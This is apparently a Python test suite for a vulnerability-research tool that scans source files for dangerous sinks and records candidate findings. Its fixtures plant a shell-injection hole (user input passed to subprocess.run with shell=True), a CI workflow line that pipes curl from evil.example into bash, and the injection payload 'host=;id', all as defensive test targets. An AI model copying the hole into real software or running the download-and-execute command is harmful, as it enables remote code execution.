#!/usr/bin/env python3
"""Tests for the Carlini Loop track (tools/carlini_loop.py).

Covers the 2026-research-derived per-file brute-force analysis pattern:
bounded enumeration, deterministic briefing, unit emission, the offline
sink-catalog floor, and idempotent harness result intake through the normal
zero-day novelty/evidence pipeline.
"""
import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from tools.carlini_loop import (
    DEFAULT_MAX_FILES,
    SourceFile,
    _candidate_for_sink,
    _language_of,
    _load_records,
    brief_file,
    build_units,
    enumerate_files,
    offline_scan,
    register_results,
)
from tools.research_model import NoveltyLabel, ResearchCandidate, Surface
from tools.zero_day import ZeroDayResearchEngine

import tools.carlini_loop as carlini_mod
import tools.evidence as evidence_mod
import tools.novelty as novelty_mod


def _isolate_workspace(tmp: Path):
    """Point every ROOT constant at a temp workspace.

    ``novelty.py`` / ``evidence.py`` / ``carlini_loop.py`` bind ``ROOT`` at
    import time, so the env var alone is insufficient — the module attributes
    must be patched (the same convention the campaign orchestrator tests
    use for ``campaign_mod.ROOT``). Returns the list of (module, attr, old)
    for ``tearDown`` restoration.
    """
    import os
    saved_env = os.environ.get("BUGWOLF_PROJECT_ROOT")
    os.environ["BUGWOLF_PROJECT_ROOT"] = str(tmp)
    pairs = [
        (novelty_mod, "ROOT", tmp),
        (novelty_mod, "RESEARCH_ROOT", tmp / "state" / "research"),
        (evidence_mod, "ROOT", tmp),
        (evidence_mod, "RESEARCH_ROOT", tmp / "state" / "research"),
        (carlini_mod, "ROOT", tmp),
        (carlini_mod, "OUT_ROOT", tmp / "research"),
    ]
    olds = [(mod, attr, getattr(mod, attr)) for mod, attr, _ in pairs]
    for mod, attr, value in pairs:
        setattr(mod, attr, value)
    return saved_env, olds


def _restore_workspace(saved_env, olds):
    import os
    for mod, attr, old in olds:
        setattr(mod, attr, old)
    if saved_env is None:
        os.environ.pop("BUGWOLF_PROJECT_ROOT", None)
    else:
        os.environ["BUGWOLF_PROJECT_ROOT"] = saved_env


class _IsolatedWorkspaceTest(unittest.TestCase):
    """Base: every test gets a private temp workspace for state/evidence."""

    def setUp(self):
        self.ws = Path(tempfile.mkdtemp(prefix="cl-ws-"))
        self._saved_env, self._olds = _isolate_workspace(self.ws)

    def tearDown(self):
        _restore_workspace(self._saved_env, self._olds)
        shutil.rmtree(self.ws, ignore_errors=True)


def _make_project(tmp: Path) -> None:
    """Create a small bounded project with web + cloud surfaces."""
    src = tmp / "src"
    src.mkdir(parents=True)
    (src / "app.py").write_text(
        "import os\nimport subprocess\n\n"
        "def handler(request):\n"
        '    cmd = "ping " + request.params.get("host", "")\n'
        "    return subprocess.run(cmd, shell=True)\n",
        encoding="utf-8")
    (src / "safe.py").write_text(
        "def add(a, b):\n    return a + b\n",
        encoding="utf-8")
    (src / "workflow.yml").write_text(
        "name: deploy\non: pull_request_target\njobs:\n"
        "  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: curl https://evil.example/x.sh | bash\n",
        encoding="utf-8")
    nm = tmp / "node_modules" / "pkg"
    nm.mkdir(parents=True, exist_ok=True)
    (nm / "index.js").write_text(
        "eval(payload)\n", encoding="utf-8")  # must be skipped
    (tmp / "README.md").write_text("not source\n", encoding="utf-8")


class TestEnumerateFiles(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        _make_project(Path(self.tmp.name))

    def tearDown(self):
        self.tmp.cleanup()

    def test_web_surface_filters_by_extension_and_skips_noise(self):
        files = enumerate_files(self.tmp.name, surfaces=["web_api"])
        rels = {f.relative for f in files}
        self.assertIn("src/app.py", rels)
        self.assertIn("src/safe.py", rels)
        # node_modules and README are never source.
        self.assertNotIn("node_modules/pkg/index.js", rels)
        self.assertNotIn("README.md", rels)

    def test_cloud_surface_only_picks_ci_artifacts(self):
        files = enumerate_files(self.tmp.name, surfaces=["cloud_cicd"])
        rels = {f.relative for f in files}
        self.assertIn("src/workflow.yml", rels)
        self.assertNotIn("src/app.py", rels)

    def test_single_file_path_is_accepted(self):
        files = enumerate_files(Path(self.tmp.name) / "src" / "app.py",
                                surfaces=["web_api"])
        self.assertEqual(len(files), 1)
        self.assertEqual(files[0].relative, "app.py")

    def test_bounds_cap_the_walk(self):
        files = enumerate_files(self.tmp.name, surfaces=["web_api"],
                                max_files=1)
        self.assertLessEqual(len(files), 1)

    def test_source_file_shape(self):
        files = enumerate_files(Path(self.tmp.name) / "src" / "app.py",
                                surfaces=["web_api"])
        self.assertEqual(files[0].surface, "web_api")
        self.assertEqual(files[0].language, "python")
        self.assertEqual(len(files[0].sha256), 64)
        self.assertGreater(files[0].line_count, 0)

    def test_language_detection(self):
        self.assertEqual(_language_of(Path("a.py"), "web_api"), "python")
        self.assertEqual(_language_of(Path("a.sol"), "smart_contract"), "solidity")
        self.assertEqual(_language_of(Path("Dockerfile"), "cloud_cicd"), "dockerfile")


class TestBriefFile(unittest.TestCase):
    def test_detects_sinks_entry_points_and_imports(self):
        text = (
            "import os\nimport subprocess\n\n"
            "def handler(request):\n"
            '    cmd = "ping " + request.params.get("host", "")\n'
            "    return subprocess.run(cmd, shell=True)\n")
        briefing = brief_file(Path("app.py"), "app.py", text, surface="web_api")
        self.assertIn("os", " ".join(briefing["imports"]))
        self.assertIn("subprocess", " ".join(briefing["imports"]))
        self.assertIn("handler", briefing["functions"])
        self.assertTrue(any(ep["kind"] == "http_handler"
                            for ep in briefing["entry_points"]))
        sink_classes = {s["bug_class"] for s in briefing["sinks"]}
        self.assertIn("command_execution", sink_classes)
        command = next(s for s in briefing["sinks"]
                       if s["bug_class"] == "command_execution")
        self.assertEqual(command["line"], 6)
        self.assertIn("RCE", command["note"])

    def test_safe_file_has_no_sinks(self):
        briefing = brief_file(Path("safe.py"), "safe.py",
                              "def add(a, b):\n    return a + b\n",
                              surface="web_api")
        self.assertEqual(briefing["sinks"], [])

    def test_redacts_long_lines(self):
        long_line = "x = " + "a" * 500
        briefing = brief_file(Path("f.py"), "f.py", long_line + "\n",
                              surface="web_api")
        for sink in briefing["sinks"]:
            self.assertLessEqual(len(sink["snippet"]), 240)
        for item in briefing["entry_points"]:
            self.assertLessEqual(len(item["snippet"]), 160)


class TestOfflineScan(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        _make_project(Path(self.tmp.name))
        self.files = enumerate_files(self.tmp.name, surfaces=["web_api"])

    def tearDown(self):
        self.tmp.cleanup()

    def test_offline_scan_registers_sink_candidates(self):
        candidates = offline_scan("t", self.files, surface="web_api")
        classes = {c.bug_class for c in candidates}
        self.assertIn("command_execution", classes)
        cmd = next(c for c in candidates if c.bug_class == "command_execution")
        self.assertIn("app.py:6", cmd.location)
        self.assertEqual(cmd.severity, "critical")
        self.assertFalse(cmd.trigger_trace)  # hypothesis only — no claim
        self.assertEqual(cmd.metadata.get("source"), "carlini-loop")

    def test_offline_scan_requires_no_network(self):
        # Pure function of local text — must not raise and must be fast.
        candidates = offline_scan("t", self.files, surface="web_api")
        self.assertIsInstance(candidates, list)

    def test_candidate_for_sink_shape(self):
        file_info = self.files[0]
        briefing = brief_file(file_info.path, file_info.relative,
                              file_info.path.read_text(encoding="utf-8"),
                              surface="web_api")
        sink = briefing["sinks"][0]
        candidate = _candidate_for_sink("t", file_info, briefing, sink)
        self.assertIsInstance(candidate, ResearchCandidate)
        self.assertEqual(candidate.surface, Surface.WEB_API)
        self.assertIn(f"{file_info.relative}:{sink['line']}", candidate.location)


class TestBuildUnits(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        _make_project(Path(self.tmp.name))

    def tearDown(self):
        self.tmp.cleanup()

    def test_one_unit_per_file_with_briefing_context(self):
        files = enumerate_files(self.tmp.name, surfaces=["web_api"])
        units = build_units("t", files, surface="web_api")
        self.assertEqual(len(units), len(files))
        unit = next(u for u in units if "app.py" in u["objective"])
        self.assertEqual(unit["schema"], "bugwolf-research-unit-v1")
        self.assertEqual(unit["bug_class"], "carlini-loop")
        ctx = unit["context"]
        self.assertTrue(ctx["carlini_loop"])
        self.assertEqual(ctx["source_file"]["path"], "src/app.py")
        self.assertIn("instructions", ctx)
        self.assertIn("CTF", ctx["instructions"])
        # The briefing ships inside the unit context (redacted).
        self.assertIn("sinks", ctx["briefing"])

    def test_units_are_advisory_not_execution(self):
        files = enumerate_files(Path(self.tmp.name) / "src" / "app.py",
                                surfaces=["web_api"])
        units = build_units("t", files, surface="web_api")
        self.assertIn("available_tools", units[0])
        self.assertIn("success_criteria", units[0])


class TestRegisterResults(_IsolatedWorkspaceTest):
    def setUp(self):
        super().setUp()
        self.tmp = tempfile.TemporaryDirectory()
        _make_project(Path(self.tmp.name))
        self.intake = Path(self.tmp.name) / "intake.jsonl"
        self.intake.write_text("\n".join([
            json.dumps({
                "location": "src/app.py", "line": 6,
                "bug_class": "command_execution",
                "title": "RCE via ping",
                "hypothesis": "request.params host reaches subprocess.run(shell=True)",
                "severity": "critical", "confidence": 0.9,
                "trigger_trace": "host=;id",
                "impact_trace": "command output in response",
            }),
            json.dumps({
                "location": "src/workflow.yml", "line": 2,
                "bug_class": "workflow_trust_boundary",
                "title": "pull_request_target",
                "hypothesis": "privileged context on PR input",
                "severity": "critical", "confidence": 0.7,
                "surface": "cloud_cicd",
            }),
            json.dumps({"bug_class": "", "hypothesis": ""}),  # skipped
        ]) + "\n", encoding="utf-8")

    def tearDown(self):
        super().tearDown()
        self.tmp.cleanup()

    def test_intake_registers_through_zero_day_engine(self):
        records = _load_records(self.intake)
        self.assertEqual(len(records), 3)
        # Point the workspace at the temp dir so state stays local.
        result = self._register(records)
        self.assertEqual(result["intake_records"], 3)
        self.assertEqual(result["registered"], 2)  # blank record skipped
        self.assertEqual(result["kept"], 2)
        self.assertEqual(result["novel"], 2)
        self.assertEqual(result["duplicates"], 0)
        # Candidates carry the source lineage + evidence.
        by_class = {c["bug_class"]: c for c in result["candidates"]}
        self.assertIn("command_execution", by_class)
        self.assertEqual(by_class["command_execution"]["location"],
                         "src/app.py:6")
        self.assertEqual(by_class["command_execution"]["status"], "hypothesis")
        self.assertTrue(by_class["command_execution"]["evidence"])

    def test_repeat_intake_is_idempotent(self):
        records = _load_records(self.intake)
        first = self._register(records)
        second = self._register(records)
        self.assertEqual(first["registered"], 2)
        self.assertEqual(second["registered"], 0)
        self.assertEqual(second["duplicates"], 2)
        self.assertEqual(second["novel"], 0)

    def test_intake_loads_json_list(self):
        records = [json.loads(line) for line in self.intake.read_text().splitlines()]
        p = Path(self.tmp.name) / "intake-list.json"
        p.write_text(json.dumps(records), encoding="utf-8")
        loaded = _load_records(p)
        self.assertEqual(len(loaded), 3)

    def test_missing_intake_file_raises(self):
        with self.assertRaises(FileNotFoundError):
            _load_records(Path(self.tmp.name) / "nope.json")

    def _register(self, records):
        # The isolated workspace is already active (see setUp); register into
        # it and assert state stays local.
        result = register_results("cl-test", records, chains=False)
        self.assertTrue((self.ws / "research" / "cl-test"
                         / "carlini-loop" / "intake.jsonl").is_file())
        self.assertTrue((self.ws / "state" / "research" / "cl-test"
                         / "candidates.jsonl").is_file())
        return result


class TestZeroDayIntegration(_IsolatedWorkspaceTest):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        _make_project(Path(self.tmp.name))
        super().setUp()

    def tearDown(self):
        super().tearDown()
        self.tmp.cleanup()

    def test_offline_scan_candidates_register_through_engine(self):
        files = enumerate_files(self.tmp.name, surfaces=["web_api"])
        candidates = offline_scan("t", files, surface="web_api")
        engine = ZeroDayResearchEngine("t")
        registered = engine.register(candidates)
        self.assertTrue(registered)
        labels = {c.novelty for c in registered}
        self.assertIn(NoveltyLabel.POTENTIALLY_NOVEL, labels)
        # Near-match dedup: a re-report of the same sink with different
        # wording but the same location + bug class must come back as
        # LIKELY_VARIANT, never a fresh POTENTIALLY_NOVEL (the engine skips
        # identical candidate_ids by design, so the fingerprint match is the
        # meaningful signal).
        original = next(c for c in registered
                        if c.bug_class == "command_execution")
        # Slightly reworded (so candidate_id differs) but near-identical in
        # content (so similarity stays above the engine's threshold).
        variant = ResearchCandidate(
            target="t", surface=Surface.WEB_API,
            bug_class="command_execution",
            title="reported command execution",
            hypothesis=original.hypothesis.replace(
                "Trace whether", "check whether"),
            location=original.location,
            severity="critical", confidence=0.6,
            metadata={"source": "carlini-loop", "mode": "harness_intake"},
        )
        rechecked = engine.register([variant])[0]
        self.assertEqual(rechecked.novelty, NoveltyLabel.LIKELY_VARIANT)
        self.assertNotEqual(rechecked.novelty, NoveltyLabel.POTENTIALLY_NOVEL)

    def test_repo_self_scan_is_bounded(self):
        # The track must walk the whole repo without escaping its caps.
        files = enumerate_files(Path(__file__).resolve().parent.parent,
                                surfaces=["web_api"])
        self.assertLessEqual(len(files), DEFAULT_MAX_FILES)
        for f in files:
            self.assertLessEqual(f.size_bytes, 512 * 1024)
            self.assertLessEqual(f.line_count, 4000)


if __name__ == "__main__":
    unittest.main()
